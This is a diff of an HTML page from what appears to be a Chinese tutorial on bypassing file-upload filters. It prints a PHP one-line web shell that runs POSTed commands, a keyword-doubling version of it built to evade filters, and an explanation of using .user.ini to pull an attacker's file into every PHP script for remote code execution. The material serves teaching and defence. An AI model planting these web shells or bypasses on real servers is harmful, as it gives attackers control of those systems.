@@ -665,9 +665,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>pphphp</span><br><span class="line">@eevalval($_PPOSTOST[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure>
 
 <blockquote>
-<?php
-
-@eval($_POST['cmd']);
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">@<span class="keyword">eval</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure>
 </blockquote>
 <h3 id="user-ini绕过"><a href="#user-ini绕过" class="headerlink" title=".user.ini绕过"></a>.user.ini绕过</h3><p>假如<code>.htaccess</code>被过滤了，不允许上传，而上传目录下有一个php文件，则可以使用.user.ini将我们制定文件包含到我们目录下的所有PHP文件导致远程代码执行。</p>
 <ul>
